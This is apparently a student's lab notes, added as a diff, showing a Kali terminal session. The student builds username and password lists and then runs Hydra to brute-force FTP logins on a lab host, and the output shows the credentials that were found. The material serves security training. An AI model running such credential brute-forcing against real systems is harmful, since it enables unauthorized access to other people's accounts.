@@ -1,0 +1,26 @@
+attack in metasploit by hydra 
+                                                                  
+┌──(student㉿kali)-[~]
+└─$ cd Desktop
+                                                                                
+┌──(student㉿kali)-[~/Desktop]
+└─$ nano pass.txt  --create pass.txt file that have many wrong password and one write password         
+                                                                                
+┌──(student㉿kali)-[~/Desktop]
+└─$ nano user.txt  -- create user.txt file that have many wrong username and one write username of metasploit login  
+                                                                                
+┌──(student㉿kali)-[~/Desktop]
+└─$ pwd                                                                                       
+/home/student/Desktop
+                                                                                                
+┌──(student㉿kali)-[~/Desktop] -- atteck by file then user -L & -P then file else user -l & -p then value
+└─$ hydra -L /home/student/Desktop/user.txt -P /home/student/Desktop/pass.txt ftp://192.168.0.119
+Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-14 12:05:40
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 135 login tries (l:9/p:15), ~9 tries per task
+[DATA] attacking ftp://192.168.0.119:21/
+[21][ftp] host: 192.168.0.119   login: msfadmin   password: msfadmin
+[21][ftp] host: 192.168.0.119   login: msfadmin   password: msfadmin
+1 of 1 target successfully completed, 2 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-14 12:06:03
